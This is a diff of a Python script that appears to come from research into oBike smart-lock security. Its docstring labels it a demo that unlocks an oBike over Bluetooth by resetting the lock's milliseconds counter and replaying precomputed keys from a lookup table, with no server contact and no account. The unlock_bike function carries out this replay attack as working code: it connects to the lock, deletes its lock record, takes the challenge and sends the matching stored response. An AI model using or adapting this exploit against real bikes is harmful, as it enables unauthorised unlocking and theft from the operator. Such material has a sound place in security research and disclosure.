@@ -1,9 +1,13 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+"""Demo 2: unlock oBike by resetting the milliseconds counter
+and replaying a key from a lookup table; requires neither interaction
+with the oBike servers nor a valid account.
+"""
+
 from bluepy.btle import Scanner, DefaultDelegate
 from obike.ble_client import BleClient
-from obike.ble_scanner import BleScanner
 from obike.http_client import HttpClient
 from colorama import Fore, Back, Style
 import json
@@ -37,22 +41,22 @@ def unlock_bike(mac, keys, iface=0):
     c.connect()
 
     # [1] say hello to lock
-    res = c.hello()
+    res = c.get_lock_record()
     if len(res) > 5:
         # if necessary, lock bike first
         ts = struct.unpack('>I', res[10:14])[0]
         print "timestamp: %d" % ts
-        c.hello_lock_bike(ts)
+        c.delete_lock_record(ts)
 
     # [2] receive challenge
-    challenge = c.push_coords(8.5308422, 47.372763).encode('hex').upper()
+    challenge = c.get_challenge(8.5308422, 47.372763).encode('hex').upper()
     print "Challenge: %s" % challenge
 
     # look up response
     row = keys[challenge.lower()]
 
     # [5] send response to lock
-    c.send_keys(int(row[1]), int(row[3])/1000, row[2].decode('hex'))
+    c.send_response(int(row[1]), int(row[3])/1000, row[2].decode('hex'))
 
     # [6] TODO get acknowledgement from lock
     # [7] TODO send acknowledgement to obike server
@@ -62,7 +66,7 @@ def unlock_bike(mac, keys, iface=0):
 
 
 parser = argparse.ArgumentParser(
-    prog='scanner.py', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    prog='unlock02.py', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 parser.add_argument('-i', '--iface', help='hci interface number',
                     type=int, default=0)
 parser.add_argument('-m', '--macaddr', help='The mac address of the obike',
